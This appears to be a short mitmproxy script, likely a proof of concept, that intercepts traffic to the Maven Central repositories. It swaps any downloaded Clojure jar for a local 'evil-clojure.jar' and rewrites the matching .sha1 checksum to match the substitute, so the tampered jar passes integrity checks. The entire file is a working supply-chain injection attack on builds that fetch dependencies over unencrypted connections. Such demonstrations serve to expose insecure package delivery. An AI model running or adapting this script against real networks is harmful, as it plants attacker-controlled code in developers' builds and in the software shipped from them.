import re
import hashlib
evil_jar = open("evil-clojure.jar").read()

out = open("foo", "w")
def response(context, flow):
    if (flow.request.host == "repo1.maven.org") or (flow.request.host == "repo.maven.apache.org"):
        if re.match(".*clojure.*\.jar$", flow.request.path):
            flow.response.content = evil_jar
        elif re.match(".*clojure.*\.jar.sha1", flow.request.path):
            flow.response.content =  hashlib.sha1(evil_jar).hexdigest()
            

